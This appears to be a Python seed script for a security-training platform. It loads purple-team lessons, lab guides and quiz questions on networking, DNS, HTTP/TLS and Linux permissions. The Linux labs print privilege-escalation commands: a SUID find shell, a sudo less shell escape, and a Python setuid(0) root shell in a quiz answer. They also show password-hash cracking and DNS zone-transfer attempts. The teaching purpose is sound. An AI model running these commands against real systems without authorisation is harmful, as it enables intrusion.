"""
seed_purple_team_curriculum.py
==============================
Phase 2: Comprehensive Purple Team Curriculum Seed

Populates:
  - 6 SkillAreas (Pillars)
  - CurriculumWeeks (12-week job-ready + ongoing mastery)
  - Topics with full TopicLearningModule (theory, lab guide, assessment, real-world context)
  - AssessmentQuestion MCQs (3 per topic)
  - JobRole "Purple Team Operator" with all topics mapped

Designed to be run standalone:
  python seed_purple_team_curriculum.py

Or imported and called:
  import seed_purple_team_curriculum; seed_purple_team_curriculum.main()

Safe to re-run: uses get_or_create patterns to avoid duplicates.
"""

import json
import sys
import os

# ── Flask app context ───────────────────────────────────────────────────────
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from app import app, db
from models import (
    SkillArea, CurriculumWeek, Topic, TopicLearningModule,
    AssessmentQuestion, JobRole, JobRoleTopic,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _get_or_create(model, lookup: dict, defaults: dict = None):
    """Get existing row or create a new one. Returns (instance, created)."""
    instance = model.query.filter_by(**lookup).first()
    if instance:
        return instance, False
    params = {**lookup, **(defaults or {})}
    instance = model(**params)
    db.session.add(instance)
    db.session.flush()  # get PK without committing
    return instance, True


def _topic(skill_area_id, week_id, title, slug, description, difficulty,
           estimated_minutes, theory_md, lab_guide_md, assessment_md,
           real_world_md, video_url="", video_title="", video_source="YouTube"):
    """Create or update a Topic + its TopicLearningModule."""
    topic, created = _get_or_create(
        Topic,
        lookup={"slug": slug},
        defaults={
            "title": title,
            "description": description,
            "skill_area_id": skill_area_id,
            "difficulty": difficulty,
            "estimated_minutes": estimated_minutes,
            "week_id": week_id,
        },
    )
    if not created:
        topic.week_id = week_id
        topic.skill_area_id = skill_area_id

    # Upsert the learning module
    if topic.learning_module is None:
        module = TopicLearningModule(
            topic_id=topic.id,
            theory_md=theory_md,
            video_url=video_url,
            video_title=video_title,
            video_source=video_source,
            lab_guide_md=lab_guide_md,
            assessment_md=assessment_md,
            real_world_md=real_world_md,
        )
        db.session.add(module)
    else:
        m = topic.learning_module
        m.theory_md = theory_md
        m.lab_guide_md = lab_guide_md
        m.assessment_md = assessment_md
        m.real_world_md = real_world_md
        if video_url:
            m.video_url = video_url
            m.video_title = video_title
            m.video_source = video_source

    return topic


def _questions(topic, skill_area_id, qs):
    """Seed MCQ assessment questions for a topic (skips duplicates)."""
    for q_text, opts, correct_idx, explanation, difficulty in qs:
        existing = AssessmentQuestion.query.filter_by(
            topic_id=topic.id,
            question_text=q_text,
        ).first()
        if existing:
            continue
        db.session.add(AssessmentQuestion(
            skill_area_id=skill_area_id,
            topic_id=topic.id,
            question_text=q_text,
            question_type="mcq",
            options=json.dumps(opts),
            correct_answer=str(correct_idx),
            explanation=explanation,
            difficulty=difficulty,
            is_active=True,
        ))


# ===========================================================================
# MAIN SEED
# ===========================================================================

def main():
    with app.app_context():
        print("=" * 70)
        print("  SkillSprint Academy — Purple Team Curriculum Seed (Phase 2)")
        print("=" * 70)

        # ── SKILL AREAS (Pillars) ─────────────────────────────────────────
        sa_net, _ = _get_or_create(SkillArea, {"slug": "networking"}, {
            "name": "Computer Networking",
            "description": "TCP/IP fundamentals, protocols, packet analysis, and network security.",
            "icon_class": "bi-wifi",
            "color_hex": "#6366f1",
            "order_index": 1,
        })
        sa_linux, _ = _get_or_create(SkillArea, {"slug": "linux-admin"}, {
            "name": "Linux Administration",
            "description": "Linux filesystem, users, Bash scripting, hardening, and log management.",
            "icon_class": "bi-terminal-fill",
            "color_hex": "#10b981",
            "order_index": 2,
        })
        sa_recon, _ = _get_or_create(SkillArea, {"slug": "osint-recon"}, {
            "name": "OSINT & Reconnaissance",
            "description": "Passive OSINT, active recon, DNS enumeration, and target profiling.",
            "icon_class": "bi-search",
            "color_hex": "#f59e0b",
            "order_index": 3,
        })
        sa_red, _ = _get_or_create(SkillArea, {"slug": "red-team"}, {
            "name": "Red Team Operations",
            "description": "Exploitation, AD attacks, C2 frameworks, lateral movement, and evasion.",
            "icon_class": "bi-bug-fill",
            "color_hex": "#f43f5e",
            "order_index": 4,
        })
        sa_blue, _ = _get_or_create(SkillArea, {"slug": "blue-team"}, {
            "name": "Blue Team Operations",
            "description": "SIEM, Sigma rules, detection engineering, threat hunting, and IR.",
            "icon_class": "bi-shield-fill-check",
            "color_hex": "#06b6d4",
            "order_index": 5,
        })
        sa_prof, _ = _get_or_create(SkillArea, {"slug": "professional-dev"}, {
            "name": "Professional Development",
            "description": "Report writing, career planning, ethics, certifications, and soft skills.",
            "icon_class": "bi-award-fill",
            "color_hex": "#a855f7",
            "order_index": 6,
        })
        db.session.flush()

        print("[+] SkillAreas seeded.")

        # ── CURRICULUM WEEKS ──────────────────────────────────────────────
        weeks_data = [
            (1, "Networking & OS Foundations", "month1",
             "Build TCP/IP literacy, Linux fluency, and the security mindset needed for all future work."),
            (2, "Scanning, Recon & Web Basics", "month1",
             "Master active/passive recon, nmap, OSINT tooling, and HTTP fundamentals."),
            (3, "Web App Attacks & OSINT Depth", "month1",
             "Exploit OWASP Top 10 against DVWA; develop full target profile using OSINT."),
            (4, "Active Directory Foundations", "month2",
             "Understand AD architecture, enumeration, and initial access techniques."),
            (5, "AD Exploitation — Kerberos Attacks", "month2",
             "Master Kerberoasting, AS-REP roasting, Pass-the-Hash, and lateral movement."),
            (6, "AD Persistence & C2", "month2",
             "DCSync, Golden/Silver Tickets, C2 frameworks, and exfiltration techniques."),
            (7, "Detection Basics — SIEM & Logging", "month2",
             "Configure Wazuh, understand Windows Event IDs, write first Sigma rules."),
            (8, "Detection Engineering", "month3",
             "Build detection logic for AD attacks; implement a detection CI/CD workflow."),
            (9, "Threat Hunting & Incident Response", "month3",
             "Apply TaHiTI/PEAK frameworks, conduct memory/disk forensics, run IR playbooks."),
            (10, "Malware Analysis & Evasion Awareness", "month3",
             "Static and dynamic malware analysis; understand LOLBins and AV evasion concepts."),
            (11, "Purple Team Integration", "month3",
             "Run coordinated purple team exercises: attack, detect, improve rule, repeat."),
            (12, "Capstone — Full Purple Chain", "month3",
             "End-to-end: GOAD attack chain → Wazuh detection → Sigma rules → professional report."),
            (13, "Advanced Offense", "ongoing",
             "AD delegation abuse, advanced web exploitation, exploit development basics."),
            (14, "Cloud Security", "ongoing",
             "AWS/Azure IAM abuse, Kubernetes attack paths, container escape, supply chain attacks."),
            (15, "Advanced Detection & Automation", "ongoing",
             "Multi-stage detection, behavioral analytics, detection-as-code CI/CD pipeline."),
        ]

        week_objs = {}
        for wnum, wtitle, wphase, wgoal in weeks_data:
            w, _ = _get_or_create(CurriculumWeek, {"week_number": wnum}, {
                "title": wtitle,
                "phase": wphase,
                "goal_description": wgoal,
                "order_index": wnum,
            })
            week_objs[wnum] = w

        db.session.flush()
        print("[+] CurriculumWeeks seeded.")

        # ── TOPICS ────────────────────────────────────────────────────────
        topics_created = 0
        all_topics = []

        # ================================================================
        # PILLAR 1: COMPUTER NETWORKING
        # ================================================================

        t = _topic(
            skill_area_id=sa_net.id, week_id=week_objs[1].id,
            title="OSI & TCP/IP Model Deep Dive",
            slug="osi-tcpip-model",
            description="Understand the 7-layer OSI model and 4-layer TCP/IP stack with security implications at each layer.",
            difficulty=2, estimated_minutes=90,
            theory_md="""## OSI & TCP/IP Model

The **OSI (Open Systems Interconnection)** model provides a conceptual framework for understanding how data travels across a network. Every cybersecurity professional must internalize these layers because attacks and defenses operate at specific layers.

### The 7 OSI Layers

| Layer | Name | PDU | Key Protocols | Attack Surface |
|-------|------|-----|---------------|----------------|
| 7 | Application | Data | HTTP, DNS, SMTP, FTP | SQL injection, XSS, SSRF |
| 6 | Presentation | Data | SSL/TLS, JPEG, MPEG | TLS downgrade, cert pinning bypass |
| 5 | Session | Data | NetBIOS, RPC, SMB | Session hijacking |
| 4 | Transport | Segment | TCP, UDP | SYN flood, port scanning |
| 3 | Network | Packet | IP, ICMP, OSPF | IP spoofing, ICMP redirect |
| 2 | Data Link | Frame | Ethernet, ARP, 802.11 | ARP spoofing, MAC flooding |
| 1 | Physical | Bits | Ethernet cable, Wi-Fi | Physical tapping |

### TCP/IP Stack vs OSI

```
Application   → HTTP, DNS, SMTP (layers 5-7)
Transport     → TCP, UDP (layer 4)
Internet      → IP, ICMP (layer 3)
Network Access→ Ethernet, ARP (layers 1-2)
```

### Critical TCP Concepts for Security

**TCP Three-Way Handshake:**
```
Client → SYN → Server
Client ← SYN-ACK ← Server
Client → ACK → Server
[Connection Established]
```

**SYN Flood Attack:** Attacker sends thousands of SYN packets but never completes the handshake, exhausting the server's connection table. Detect with: `netstat -ant | grep SYN_RECV | wc -l`

**TCP Flags:** `SYN`, `ACK`, `FIN`, `RST`, `PSH`, `URG` — nmap uses various flag combinations for stealth scanning (e.g., SYN scan `-sS`, FIN scan `-sF`).

### IP Addressing Essentials

- **IPv4:** 32-bit, written as 4 octets (192.168.1.1)
- **Subnetting:** CIDR notation — `/24` = 254 usable hosts, `/16` = 65,534 hosts
- **Private ranges:** 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
- **Loopback:** 127.0.0.1 — always points to local machine
- **APIPA:** 169.254.0.0/16 — auto-assigned when DHCP fails (indicator of misconfiguration)

### Security Mindset: Defense in Depth

Apply controls at every layer:
- Layer 7: WAF, input validation
- Layer 4: Firewall rules (stateful)
- Layer 3: ACLs, route filtering
- Layer 2: 802.1X port authentication, private VLANs
""",
            lab_guide_md="""## Lab: Packet Analysis with Wireshark

### Prerequisites
- Wireshark installed on Kali Linux
- Access to a network (host-only adapter)

### Exercise 1 — Capture a TCP Handshake
```bash
# Start capture on Kali
sudo tshark -i eth0 -c 50 -w /tmp/capture.pcap

# From another terminal, trigger a TCP connection
curl http://192.168.56.1

# Stop capture (Ctrl+C), open in Wireshark
wireshark /tmp/capture.pcap &
```

Filter: `tcp.flags.syn == 1` to see SYN packets.

### Exercise 2 — Identify OSI Layers in a Frame
1. Click on any TCP packet in Wireshark
2. Expand each layer in the packet details pane:
   - **Frame** → Physical/Data Link
   - **Ethernet II** → Data Link (MAC addresses)
   - **Internet Protocol** → Network (IP addresses)
   - **Transmission Control Protocol** → Transport (ports, flags)
   - **HTTP/other** → Application

### Exercise 3 — Spot an ARP Request
Filter: `arp` — notice how ARP broadcasts ask "Who has IP X? Tell IP Y".
This is the mechanism exploited in ARP spoofing attacks.

### Mastery Check
- [ ] Captured and identified all 3 packets in a TCP handshake
- [ ] Labeled the OSI layer for each protocol in a captured frame
- [ ] Identified at least one ARP request and one ARP reply
""",
            assessment_md="""## Self-Assessment Questions

1. A SYN flood attack targets which OSI layer?
2. What is the purpose of the TCP RST flag?
3. Which layer does ARP operate at?
4. Convert /25 subnet mask to dotted-decimal notation.
5. What port does HTTPS use and which transport protocol?
""",
            real_world_md="""## Real-World Context

**SOC Analyst relevance:** When investigating a potential DDoS incident, you'll examine `SYN_RECV` connection states and anomalous traffic patterns in your SIEM (e.g., Wazuh alert "Possible SYN flood detected").

**Pentester relevance:** Every nmap scan you run exploits TCP/IP behavior. Understanding how `SYN-ACK` responses differ from `RST` responses tells you whether a port is open, closed, or filtered by a firewall.

**Certification mapping:** CompTIA Security+, eJPT, and CEH all heavily test OSI knowledge. CCNA Security includes OSI as a foundation.

**Tool:** `tcpdump -i eth0 'tcp[13] & 2 != 0'` captures only SYN packets — your first step in detecting scanning activity on a network sensor.
""",
            video_url="https://www.youtube.com/watch?v=vv4y_uOneC0",
            video_title="OSI Model Explained | Real World Examples",
            video_source="YouTube",
        )
        all_topics.append(t)
        _questions(t, sa_net.id, [
            ("Which OSI layer is responsible for end-to-end delivery and reliable data transfer?",
             ["Layer 2 — Data Link", "Layer 3 — Network", "Layer 4 — Transport", "Layer 7 — Application"],
             2, "Layer 4 (Transport) handles end-to-end reliability via TCP (acknowledgements, retransmission) and connectionless delivery via UDP.", 1),
            ("During a TCP SYN flood attack, which resource on the target server is exhausted?",
             ["CPU cycles from packet processing", "The server's half-open connection table (TCB)", "Available disk space for logs", "Memory allocated to HTTP sessions"],
             1, "A SYN flood fills the server's TCB (Transmission Control Block) with half-open connections, preventing legitimate connections from being established.", 2),
            ("An attacker sends gratuitous ARP replies claiming to be the default gateway. Which OSI layer is being exploited?",
             ["Layer 1 — Physical", "Layer 2 — Data Link", "Layer 3 — Network", "Layer 4 — Transport"],
             1, "ARP (Address Resolution Protocol) operates at Layer 2 (Data Link). ARP spoofing poisons the Layer 2 address mapping to redirect traffic.", 2),
        ])

        # ─── Networking Topic 2 ─────────────────────────────────────────
        t = _topic(
            skill_area_id=sa_net.id, week_id=week_objs[1].id,
            title="DNS — Architecture, Attacks & Defense",
            slug="dns-attacks-defense",
            description="How DNS resolves names, common DNS record types, zone transfer risks, and DNS-based attacks.",
            difficulty=2, estimated_minutes=75,
            theory_md="""## DNS: The Internet's Phone Book — and a Hacker's Playground

DNS translates human-readable hostnames (google.com) into IP addresses. It is one of the most frequently abused protocols in both attack and defense.

### DNS Hierarchy
```
Root (.)
 └── TLD (.com, .org, .net)
      └── Domain (google.com) ← Authoritative NS
           └── Subdomain (mail.google.com)
```

### Critical DNS Record Types

| Type | Purpose | Security Relevance |
|------|---------|-------------------|
| A | IPv4 address | Primary resolution target |
| AAAA | IPv6 address | IPv6 enumeration |
| MX | Mail server | Email spoofing intel |
| NS | Name server | Zone transfer target |
| PTR | Reverse DNS | Recon: host → IP mapping |
| CNAME | Alias | Subdomain takeover via dangling CNAME |
| TXT | Text/SPF | Recon: SPF, DKIM, DMARC, API key leaks |
| SOA | Zone authority | Zone transfer setup |
| SRV | Service location | AD: _kerberos._tcp, _ldap._tcp |

### DNS Zone Transfer (AXFR)
A misconfigured DNS server may allow any client to request all records:
```bash
# Check if zone transfer is allowed (offensive)
dig axfr @ns1.target.com target.com

# This reveals ALL subdomains, IPs, and internal hostnames
# Defence: restrict AXFR to authorised secondary NS IPs only
```

### DNS-Based Attacks
- **DNS Cache Poisoning (Kaminsky Attack):** Inject false DNS records into a resolver's cache
- **DNS Tunneling:** Encode data in DNS queries/responses to exfiltrate data through DNS (bypasses most firewalls)
- **Subdomain Takeover:** Dangling CNAME pointing to decommissioned service
- **DNS Rebinding:** Bypass same-origin policy via rapid TTL manipulation
- **NXDOMAIN Harvesting:** Query all possible subdomains to map the target

### DNS Security Extensions
- **DNSSEC:** Adds cryptographic signatures to DNS responses
- **DNS over HTTPS (DoH):** Encrypts DNS traffic (also complicates monitoring)
- **DNS over TLS (DoT):** Alternative encrypted transport

### Defensive DNS Monitoring
Look for:
- Abnormally high DNS query volume from a single host (tunneling indicator)
- Queries to newly registered domains (threat intel feeds)
- `TXT` record queries for non-standard names (C2 channel indicator)
- Failed AXFR attempts in DNS server logs
""",
            lab_guide_md="""## Lab: DNS Enumeration & Zone Transfer Testing

### Exercise 1 — Basic DNS Recon
```bash
# On Kali Linux
# Query A record
dig A target.local @192.168.56.1

# Query MX records
dig MX target.local @192.168.56.1

# Reverse lookup
dig PTR 192.168.56.10

# Query TXT records (look for SPF, DKIM, internal notes)
dig TXT target.local
```

### Exercise 2 — Automated Subdomain Enumeration
```bash
# Install subfinder (may already be on Kali)
subfinder -d target.local -o subdomains.txt

# Use dnsx to resolve and validate
cat subdomains.txt | dnsx -silent

# Amass passive enumeration
amass enum -passive -d target.local
```

### Exercise 3 — Zone Transfer Attempt
```bash
# Attempt zone transfer (will fail on hardened DNS)
dig axfr @ns1.target.local target.local

# If successful, you'll see all DNS records
# Document as: Critical Finding — DNS Zone Transfer Allowed
```

### Exercise 4 — DNS Tunneling Detection (Blue Team)
```bash
# On Wazuh/SIEM: look for DNS queries > 50 characters
# Or queries with base64-encoded subdomains
# Indicator: high-frequency queries to same domain with varying subdomains
grep "dns" /var/ossec/logs/alerts/alerts.json | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        a = json.loads(line)
        name = a.get('data',{}).get('dns',{}).get('query','')
        if len(name) > 50:
            print(f'SUSPICIOUS DNS: {name}')
    except: pass
"
```

### Mastery Check
- [ ] Performed full DNS enumeration on a test target
- [ ] Attempted (and documented result of) zone transfer
- [ ] Wrote a Wazuh custom rule to alert on DNS queries > 60 chars
""",
            assessment_md="""## Self-Assessment
1. What DNS record type would reveal a company's mail server addresses?
2. How does DNS tunneling bypass traditional firewall rules?
3. What is a subdomain takeover and how is it detected?
4. Why should zone transfers be restricted to specific IP addresses?
5. What does a PTR record allow an attacker to discover?
""",
            real_world_md="""## Real-World Context

**Incident:** In the 2019 DNSpionage campaign, attackers compromised DNS infrastructure to redirect traffic and intercept credentials. Understanding DNS deeply helped defenders trace the attack path.

**Blue Team:** Wazuh Rule ID 31101 detects DNS anomalies. Sigma rule `dns_tunneling_tools.yml` catches common DNS tunneling tools like iodine and dnscat2.

**Red Team:** DNS is often unmonitored and whitelisted through firewalls. `dnscat2` uses DNS to create an encrypted C2 channel that bypasses most DLP solutions.

**Certification mapping:** CEH, eJPT, OSCP — DNS enumeration is a required skill on all practical exams.
""",
        )
        all_topics.append(t)
        _questions(t, sa_net.id, [
            ("Which DNS record type is used by Active Directory to advertise Kerberos and LDAP service locations?",
             ["A record", "MX record", "SRV record", "CNAME record"],
             2, "SRV records are used by AD clients to locate domain controllers, KDC, and LDAP services via entries like _kerberos._tcp.domain.com.", 2),
            ("An attacker encodes stolen data in DNS TXT record query subdomains and sends 10,000 queries per minute to their server. What attack technique is this?",
             ["DNS Cache Poisoning", "DNS Amplification Attack", "DNS Tunneling", "NXDOMAIN Harvesting"],
             2, "DNS Tunneling encodes arbitrary data (commands, exfiltrated data) within DNS protocol fields (subdomains, TXT responses) to bypass firewall controls that allow DNS traffic.", 3),
            ("A company's DNS server responds to AXFR requests from any source IP. What is the immediate remediation?",
             ["Disable DNSSEC on the zone", "Restrict zone transfers to authorised secondary NS IP addresses only", "Increase the DNS TTL to 86400 seconds", "Enable DNS over HTTPS"],
             1, "Zone transfers (AXFR) should be restricted to known secondary name server IP addresses using ACLs. Unrestricted AXFR leaks the entire internal hostname/IP mapping.", 1),
        ])

        # ─── Networking Topic 3 ─────────────────────────────────────────
        t = _topic(
            skill_area_id=sa_net.id, week_id=week_objs[1].id,
            title="HTTP/S, TLS & Web Traffic Analysis",
            slug="http-tls-analysis",
            description="HTTP methods, headers, status codes, TLS handshake, certificate chains, and traffic interception.",
            difficulty=2, estimated_minutes=80,
            theory_md="""## HTTP/S and TLS — The Protocol Every Security Professional Must Master

### HTTP Fundamentals

**Request Structure:**
```
GET /login HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
Accept: text/html
```

**Response Structure:**
```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=xyz789; HttpOnly; Secure; SameSite=Strict
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
```

**Security-Relevant HTTP Methods:**
- `GET` — Retrieve resource (should never change server state)
- `POST` — Submit data (form, API)
- `PUT/PATCH` — Update resource (check for IDOR)
- `DELETE` — Remove resource (check for authorisation)
- `OPTIONS` — Reveal allowed methods (CORS preflight)
- `TRACE` — Echo request (XST attack vector, disable in prod)

**Critical Security Headers:**
| Header | Purpose |
|--------|---------|
| `Strict-Transport-Security` | Force HTTPS |
| `Content-Security-Policy` | Prevent XSS |
| `X-Frame-Options` | Prevent clickjacking |
| `X-Content-Type-Options` | Prevent MIME sniffing |
| `Referrer-Policy` | Control referrer leakage |

### TLS Handshake (TLS 1.3)

```
Client Hello (supported ciphers, random)
   ↓
Server Hello (chosen cipher, certificate, random)
   ↓
Server Certificate (X.509, signed by CA)
   ↓
Key Exchange (ECDHE — ephemeral Diffie-Hellman)
   ↓
Client Finished (encrypted)
   ↓
[Application Data — encrypted]
```

**Forward Secrecy:** TLS 1.3 mandates ECDHE — session keys are ephemeral so past sessions can't be decrypted even if the private key is later compromised.

### Certificate Chain Analysis
```
Root CA (trusted by OS/browser)
  └── Intermediate CA
        └── End-Entity Certificate (your target)
```

Check cert details:
```bash
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -noout -text
```

Look for: SANs (Subject Alternative Names — other hostnames), expiry, issuer.

### Common TLS Attacks
- **POODLE** — SSLv3 downgrade (mitigated: disable SSLv3)
- **BEAST** — CBC mode attack on TLS 1.0
- **DROWN** — SSLv2 cross-protocol attack
- **Heartbleed** — OpenSSL buffer over-read (CVE-2014-0160)
- **SSL Stripping** — Downgrade HTTPS to HTTP via MITM (mitigated by HSTS)
""",
            lab_guide_md="""## Lab: HTTP Interception with Burp Suite

### Setup
1. Launch Burp Suite Community on Kali
2. Configure Firefox proxy: `127.0.0.1:8080`
3. Navigate to DVWA: `http://192.168.56.X/dvwa`

### Exercise 1 — Intercept and Modify a Login Request
1. Enable Intercept in Burp Proxy
2. Submit a DVWA login form
3. Modify the `username` field to `admin' --` (SQLi test)
4. Forward and observe response

### Exercise 2 — Analyse Security Headers
```bash
curl -I https://target.com | grep -iE "x-frame|csp|hsts|x-content"
```
Document any missing security headers.

### Exercise 3 — TLS Certificate Analysis
```bash
openssl s_client -connect 192.168.56.1:443 -showcerts 2>/dev/null
```
Record: certificate CN, SAN entries, expiry date, cipher suite.

### Exercise 4 — Repeater: Privilege Escalation Test
1. Log in as a low-privilege user in DVWA
2. Capture a request to an admin endpoint
3. In Burp Repeater, change `User-Agent` or `Cookie` values
4. Observe if access control is enforced

### Mastery Check
- [ ] Intercepted and modified an HTTP login request
- [ ] Identified at least 2 missing security headers
- [ ] Extracted all SAN entries from a TLS certificate
""",
            assessment_md="""## Self-Assessment
1. What is the difference between HTTP PUT and PATCH?
2. Which TLS version introduced mandatory forward secrecy?
3. What does the HttpOnly cookie flag prevent?
4. Why is the TRACE HTTP method a security risk?
5. What information do Subject Alternative Names (SANs) reveal during recon?
""",
            real_world_md="""## Real-World Context

**Bug Bounty:** HTTP security header misconfigurations are consistently rewarded. Missing `Content-Security-Policy` enables XSS escalation; missing `Strict-Transport-Security` enables SSL stripping.

**SOC:** HTTPS inspection at the proxy layer (SSL decryption) is required to detect C2 traffic hiding in TLS. Understanding the handshake helps configure decryption policies correctly.

**Certification mapping:** Burp Suite proficiency is mandatory for OSCP, eWPT, and BSCP certifications.
""",
        )
        all_topics.append(t)
        _questions(t, sa_net.id, [
            ("Which HTTP security header prevents the browser from loading the site inside an iframe, mitigating clickjacking attacks?",
             ["Content-Security-Policy", "X-Content-Type-Options", "X-Frame-Options", "Referrer-Policy"],
             2, "X-Frame-Options: DENY (or SAMEORIGIN) prevents the browser from rendering the page in iframes, directly mitigating clickjacking attacks.", 1),
            ("TLS 1.3 removed which feature compared to TLS 1.2, improving security?",
             ["Certificate pinning support", "Support for static RSA key exchange (no forward secrecy)", "HTTP/2 multiplexing", "OCSP stapling"],
             1, "TLS 1.3 removed all non-forward-secret key exchange methods (static RSA, static DH). All TLS 1.3 sessions use ephemeral Diffie-Hellman (ECDHE), ensuring forward secrecy.", 3),
            ("During reconnaissance, an attacker queries a target's TLS certificate and finds SAN entries for dev.internal.target.com and staging.target.com. What does this indicate?",
             ["The site uses self-signed certificates", "These subdomains share the same certificate and may expose internal/staging infrastructure", "The certificate is expired and should be renewed", "TLS 1.0 is in use on these subdomains"],
             1, "SANs (Subject Alternative Names) list all hostnames covered by a certificate. Discovering internal/staging subdomains via SANs is a common recon technique that reveals attack surface.", 2),
        ])

        # ================================================================
        # PILLAR 2: LINUX ADMINISTRATION
        # ================================================================

        t = _topic(
            skill_area_id=sa_linux.id, week_id=week_objs[1].id,
            title="Linux Filesystem, Permissions & User Management",
            slug="linux-filesystem-permissions",
            description="FHS, file permissions, ACLs, users/groups, sudo, and PAM — the foundation of Linux security.",
            difficulty=1, estimated_minutes=90,
            theory_md="""## Linux Filesystem & Permission Model

### Filesystem Hierarchy Standard (FHS)

| Directory | Purpose | Security Relevance |
|-----------|---------|-------------------|
| `/etc` | System configuration | Sensitive: `/etc/shadow`, `/etc/sudoers` |
| `/var/log` | Log files | DFIR: auth.log, syslog, secure |
| `/tmp`, `/var/tmp` | Temp files | Often writable — common attacker staging area |
| `/proc` | Kernel/process info | `/proc/<pid>/maps`, `/proc/net/tcp` |
| `/sys` | Kernel parameters | `/sys/kernel/security/` |
| `/home` | User home dirs | SSH keys, bash_history, config files |
| `/root` | Root home | High-value target |
| `/bin`, `/usr/bin` | Binaries | LOLBins location |
| `/dev/shm` | Shared memory (tmpfs) | Malware staging (in-memory) |

### File Permission Model

```bash
ls -la /etc/passwd
-rw-r--r-- 1 root root 2345 Jan 1 /etc/passwd
│││││││││
│││││││└─ Other: read
│││││└─── Group: read
│││└───── User (owner): read+write
││└────── Special bits (setuid/setgid/sticky)
│└─────── File type (- file, d dir, l symlink)
└──────── (implicit)
```

**Octal notation:** `chmod 755` = rwxr-xr-x

### Dangerous Permission Bits

```bash
# SUID — execute as file owner (often root)
find / -perm -4000 -type f 2>/dev/null

# SGID — execute as group owner
find / -perm -2000 -type f 2>/dev/null

# World-writable files (security risk)
find / -perm -o+w -type f 2>/dev/null

# Sticky bit on /tmp prevents users from deleting each other's files
ls -la /tmp  # Should show: drwxrwxrwt
```

### Shadow Password File

```bash
cat /etc/shadow
# operator:$6$salt$hash:18000:0:99999:7:::
#           ↑ SHA-512 hash    ↑ Last change (days since epoch)
```

Crack with: `hashcat -m 1800 shadow.txt rockyou.txt`

### sudo Configuration

```bash
# View sudo rules
sudo -l  # (as current user)
cat /etc/sudoers  # (requires root)
cat /etc/sudoers.d/*

# Common misconfigs:
# operator ALL=(ALL) NOPASSWD: ALL  ← Dangerous
# operator ALL=(root) /usr/bin/vim  ← Can escalate via vim shell
```

### PAM (Pluggable Authentication Modules)

PAM controls authentication for all Linux services. Config in `/etc/pam.d/`.

```bash
# View SSH PAM config
cat /etc/pam.d/sshd

# Common defensive modules:
# pam_faillock.so — lock after N failed attempts
# pam_pwquality.so — enforce password complexity
```
""",
            lab_guide_md="""## Lab: Linux Permission Audit & Privilege Escalation Hunt

### Exercise 1 — Find SUID Binaries
```bash
# On Kali or Metasploitable2
find / -perm -4000 -type f 2>/dev/null | sort

# Compare against GTFOBins: https://gtfobins.github.io/
# Example: if /usr/bin/find has SUID:
/usr/bin/find . -exec /bin/sh -p \\; -quit
```

### Exercise 2 — Audit /etc/sudoers
```bash
# Check what commands you can run as sudo
sudo -l

# If you see: (ALL) NOPASSWD: /usr/bin/less
# You can escalate:
sudo less /etc/passwd
# Then: !sh (inside less)
```

### Exercise 3 — World-Writable Script in cron
```bash
# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/

# Find world-writable scripts executed by root cron
find /etc/cron* -type f -perm -o+w 2>/dev/null
```

### Exercise 4 — Read /etc/shadow (privilege check)
```bash
# Only root can read this on a properly configured system
ls -la /etc/shadow
# Expected: -rw-r----- root shadow
# Vulnerable: -rw-r--r-- (world-readable!)
```

### Mastery Check
- [ ] Found all SUID binaries and checked 3 against GTFOBins
- [ ] Identified a sudo misconfiguration (NOPASSWD or dangerous binary)
- [ ] Verified /etc/shadow is NOT world-readable
- [ ] Found at least one world-writable file in /tmp or /var
""",
            assessment_md="""## Self-Assessment
1. What does the SUID bit on an executable allow?
2. Which log file records successful and failed SSH login attempts?
3. How would you find all files owned by a specific user?
4. What is the security risk of `chmod 777` on a directory?
5. Why is /tmp an attractive staging location for attackers?
""",
            real_world_md="""## Real-World Context

**Incident Response:** When investigating a compromised Linux server, the first commands analysts run check for SUID binaries added by the attacker, new user accounts in /etc/passwd, and modified cron jobs.

**LinPEAS:** The automated privilege escalation enumeration script checks all these vectors automatically. Understanding the manual checks helps you interpret LinPEAS output.

**Certification:** Linux permissions are tested on LPIC-1, CompTIA Linux+, RHCSA, and are a prerequisite for OSCP.
""",
        )
        all_topics.append(t)
        _questions(t, sa_linux.id, [
            ("An attacker finds /usr/bin/python3 has the SUID bit set. Which command could they use to escalate to root?",
             ["python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
              "python3 --privilege-escalation",
              "chmod 777 /usr/bin/python3",
              "sudo python3 -c 'os.system(\"/bin/sh\")'"],
             0, "With SUID on Python3, running os.setuid(0) sets effective UID to 0 (root), then os.system('/bin/sh') spawns a root shell.", 3),
            ("Which file contains hashed user passwords on a modern Linux system?",
             ["/etc/passwd", "/etc/shadow", "/etc/pam.d/common-auth", "/var/log/auth.log"],
             1, "/etc/shadow stores hashed passwords and is readable only by root. /etc/passwd is world-readable but contains only placeholder 'x' for passwords.", 1),
            ("A web application writes temporary files to /tmp/app_data/ with permissions 777. Why is this a security risk?",
             ["777 prevents the application from writing to the directory",
              "Any local user can read, modify, or replace the files, enabling privilege escalation or data theft",
              "777 causes the sticky bit to be automatically set",
              "Temporary files in /tmp are encrypted by default"],
             1, "chmod 777 grants read/write/execute to all users. Attackers with any local access can read sensitive temp files, replace scripts executed by privileged processes, or inject malicious code.", 2),
        ])

        # ─── Linux Topic 2 ──────────────────────────────────────────────
        t = _topic(
            skill_area_id=sa_linux.id, week_id=week_objs[1].id,
            title="Bash Scripting for Security Automation",
            slug="bash-scripting-security",
            description="Variables, control flow, functions, file parsing, and building defensive security scripts in Bash.",
            difficulty=2, estimated_minutes=100,
            theory_md="""## Bash Scripting for Security Professionals

Bash is the scripting language of security automation. From parsing logs to building custom recon tools, every practitioner must write production-quality Bash.

### Script Template (Best Practices)
```bash
#!/usr/bin/env bash
set -euo pipefail   # exit on error, unbound var, pipe failure
IFS=$'\\n\\t'       # safe word splitting

readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly LOG_FILE="/var/log/security_audit.log"

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOG_FILE"; }
err() { log "ERROR: $*" >&2; }
die() { err "$*"; exit 1; }
